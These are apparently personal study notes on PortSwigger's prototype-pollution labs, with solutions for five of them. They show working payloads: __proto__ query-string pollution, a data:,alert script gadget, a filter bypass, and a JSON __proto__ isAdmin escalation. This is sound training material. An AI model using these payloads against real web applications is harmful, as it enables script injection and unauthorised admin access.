---
created: 2026-06-12
---
| `#`  | Solved? | Name                                                                           | Date    | Notes |
| ---- | ------- | ------------------------------------------------------------------------------ | ------- | ----- |
| `1.` |         | Client-side prototype pollution via browser APIs                               |         |       |
| `2.` | `✓`     | DOM XSS via client-side prototype pollution                                    | `12.07` |       |
| `3.` |         | DOM XSS via an alternative prototype pollution vector                          |         |       |
| `4.` |         | Client-side prototype pollution via flawed sanitization<br>                    | `12.06` |       |
| `5.` |         | Client-side prototype pollution in third-party libraries                       |         |       |
| `6.` | `✓`     | Privilege escalation via server-side prototype pollution                       | `12.07` |       |
| `7.` | `✓`     | Detecting server-side prototype pollution without polluted property reflection | `12.07` |       |
| `8.` |         | Bypassing flawed input filters for server-side prototype pollution             |         |       |
| `9.` |         | Remote code execution via server-side prototype pollution                      |         |       |


## 1. Client-side prototype pollution via browser APIs

>[!note]+ Lab description
> - [`Lab: Client-side prototype pollution via browser APIs`](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis)
> - Level: #Practitioner 
> 
> This lab is vulnerable to DOM XSS via client-side prototype pollution. The website's developers have noticed a potential gadget and attempted to patch it. However, you can bypass the measures they've taken.
> 
> To solve the lab:
> 
> 1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
>     
> 2. Identify a gadget property that allows you to execute arbitrary JavaScript.
>     
> 3. Combine these to call `alert()`.
>     
> 
> You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.
> 
> This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Widespread prototype pollution gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets) by [Gareth Heyes](https://portswigger.net/research/gareth-heyes).

### Solution

## 2. DOM XSS via client-side prototype pollution

>[!done] 

>[!note]+ Lab description
> - [`Lab: DOM XSS via client-side prototype pollution`](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)
> - Level: #Practitioner 
> 
> This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:
> 
> 1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
>     
> 2. Identify a gadget property that allows you to execute arbitrary JavaScript.
>     
> 3. Combine these to call `alert()`.
>     
> 
> You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.

### Solution

#### Detecting prototype pollution

- Test the search functionality. If you turn on prototype pollution testing in DOM Invader, you will see it detects the vulnerability outright:

![[images/walkthrough/PortSwigger/Prototype pollution/lab2/1.png]]

- Burp scanner detects it too:

![[images/walkthrough/PortSwigger/Prototype pollution/lab2/2.png]]


- To probe manually, modify the URL query string:

```powershell
/?search=test&__proto__[polluted]=true
```

- Open DevTools (`F12` or `Ctrl + Shift + I`) -> `Console`. Type:

```js
Object.constructor.polluted
```

- The console outputs `true`, which means the prototype was polluted.

![[images/walkthrough/PortSwigger/Prototype pollution/lab2/3.png]]

#### Searching for gadgets

- You can use DOM Invader to `Scan for gadgets` automatically:

![[images/walkthrough/PortSwigger/Prototype pollution/lab2/4.png]]

- Click `Exploit`, you should see an alert:

![[images/walkthrough/PortSwigger/Prototype pollution/lab2/5.png]]

- The payload uses `data:` scheme:

```bash
https://0ab2003b04f979b380b0351a00910007.web-security-academy.net/?search=test&__proto__[transport_url]=data%3A%2Calert%281%29
```

- `data%3A%2Calert%281%29` decodes to:

```
data:,alert(1)
```


- And indeed, if you inspect application JavaScript, you find `/resources/js/searchLogger.js` file that reads:

```js
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```

![[images/walkthrough/PortSwigger/Prototype pollution/lab2/6.png]]

- The vulnerable `searchLogger` function assigns object parameters recursively, and doesn't filter out prototype assignments (`deparam()` from `deparam.js`).

## 3. DOM XSS via an alternative prototype pollution vector

>[!note]+ Lab description
> - [`Lab: DOM XSS via an alternative prototype pollution vector`](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)
> - Level: #Practitioner 
> 
> This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:
> 
> 1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
>     
> 2. Identify a gadget property that allows you to execute arbitrary JavaScript.
>     
> 3. Combine these to call `alert()`.
>     
> 
> You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.
> 
> 
### Solution

- In `DOM Invader`, ensure `Prototype pollution is on`.
- Test the search functionality. In the `DOM Invader` tab in `DevTools`, see a prototype pollution vulnerability is detected:

![[images/walkthrough/PortSwigger/Prototype pollution/lab3/1.png]]

- `Scan for gadgets`. Once the scan is complete, see the sink in `DevTools`:

![[images/walkthrough/PortSwigger/Prototype pollution/lab3/2.png]]

- Take a look at the stack trace and inspect the code:

```js
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}

window.addEventListener("load", searchLogger);
```

- `eval()` is being used to dynamically execute code based on the manager's sequence valye.

![[images/walkthrough/PortSwigger/Prototype pollution/lab3/2.png]]

## 4. Client-side prototype pollution via flawed sanitization



>[!note]+ Lab description
> - [`Lab: Client-side prototype pollution via flawed sanitization`](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)
> - Level: #Practitioner 
> 
> This lab is vulnerable to DOM XSS via client-side prototype pollution. Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed.
> 
> To solve the lab:
> 
> 1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
>     
> 2. Identify a gadget property that allows you to execute arbitrary JavaScript.
>     
> 3. Combine these to call `alert()`.
### Solution

- `/?__proto__[polluted]=true` won't work as before.

![[images/walkthrough/PortSwigger/Prototype pollution/lab4/1.png]]

- Attempt an alternative payload:

```
/?__pr__proto__oto__[polluted]=true
```

![[images/walkthrough/PortSwigger/Prototype pollution/lab4/2.png]]

- This works. 
- In `Sources`, search for a gadget in JavaScript files:

![[images/walkthrough/PortSwigger/Prototype pollution/lab4/3.png]]

- Try the following payload:

```
/?__pr__proto__oto__[transport_url]=test
```

![[images/walkthrough/PortSwigger/Prototype pollution/lab4/4.png]]

- The the `test` value is appended as a source of a `<script>` element. 
- To fire an `alert()`:

```
/?__pr__proto__oto__[transport_url]=data:,alert();
```

- Browse the application. In `Sources`, find `searchLoggerFiltered.js`:

![[images/walkthrough/PortSwigger/Prototype pollution/lab4/1.png]]

- The application searches for `__proto__` in parameters and strips it. However, the filter is non-recursive, so the following bypasses it:

```
/?search=test&__prot__proto__o__[polluted]=true
```

![[images/walkthrough/PortSwigger/Prototype pollution/lab4/5.png]]

![[images/walkthrough/PortSwigger/Prototype pollution/lab4/solved.png]]

Solved!
## 5. Client-side prototype pollution in third-party libraries

>[!note]+ Lab description
- [`Lab: Client-side prototype pollution in third-party libraries`](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)
- Level: #Practitioner 

### Solution

## 6. Privilege escalation via server-side prototype pollution

>[!done]

>[!note]+ Lab description
> - [`Lab: Privilege escalation via server-side prototype pollution`](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)
> - Level: #Practitioner 
> 
> This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response.
> 
> To solve the lab:
> 
> 1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
> 2. Identify a gadget property that you can use to escalate your privileges.
> 3. Access the admin panel and delete the user `carlos`.
> 
> You can log in to your own account with the following credentials: `wiener:peter`
### Solution

- Log in as `wiener`. See you can change your account information:

![[images/walkthrough/PortSwigger/Prototype pollution/lab6/1.png]]

- Submit the form and inspect the request:

![[images/walkthrough/PortSwigger/Prototype pollution/lab6/2.png]]

- See the response contains `"isAdmin":false` property.
- Send this request to `Repeater` and attempt to set the `isAdmin` property to `true` directly:

![[images/walkthrough/PortSwigger/Prototype pollution/lab6/3.png]]

- This doesn't work. Try using prototype pollution:

```json
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"7Quyigi08PhDm4LYPrufhGTiwhOA2Cdz",
	"__proto__": {
		"isAdmin":  true
	}
}
```

![[images/walkthrough/PortSwigger/Prototype pollution/lab6/4.png]]

- This time, the change seem to work.
- Now you have access to `/admin`:

![[images/walkthrough/PortSwigger/Prototype pollution/lab6/5.png]]

- Delete the `carlos` user.

![[images/walkthrough/PortSwigger/Prototype pollution/lab6/solved.png]]

Solved!
## 7. Detecting server-side prototype pollution without polluted property reflection

>[!note]+ Lab description
> - [`Lab: Detecting server-side prototype pollution without polluted property reflection`](https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection)
> - Level: #Practitioner 
> 
> This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.
> 
> To solve the lab, confirm the vulnerability by polluting `Object.prototype` in a way that triggers a noticeable but non-destructive change in the server's behavior. As this lab is designed to help you practice non-destructive detection techniques, you don't need to progress to exploitation.
> 
> You can log in to your own account with the following credentials: `wiener:peter`

### Solution

- Log in as `wiener` and change your account data.
![[images/walkthrough/PortSwigger/Prototype pollution/lab7/1.png]]

- Send this request to `Repeater`. Observe that if you add new properties, they are not reflected in the response. 
- Modify the JSON in a way that invokes an error, such as removing a comma:

![[images/walkthrough/PortSwigger/Prototype pollution/lab7/2.png]]

- See you receive an error response with the body containing a JSON error object. 
- Notice that the actual response status code is `500`, but the code in the error message is `400`.
- Fix the JSON error and try to override the status code:

```json
"__proto__": { "status":555 }
```

![[images/walkthrough/PortSwigger/Prototype pollution/lab7/3.png]]

- Confirm that you receive the normal response containing your user object.
- Then break the JSON syntax again:

![[images/walkthrough/PortSwigger/Prototype pollution/lab7/4.png]]

- Notice that your `status` is reflected in the error JSON object, which confirms pollution.

![[images/walkthrough/PortSwigger/Prototype pollution/lab7/solved.png]]

Solved!

## 8. Bypassing flawed input filters for server-side prototype pollution

>[!note]+ Lab description
- [`Lab: Bypassing flawed input filters for server-side prototype pollution`](https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution)
- Level: #Practitioner 
### Solution

## 9. Remote code execution via server-side prototype pollution

>[!note]+ Lab description
- Level: #Practitioner 
- [`Lab: Remote code execution via server-side prototype pollution`](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)

### Solution
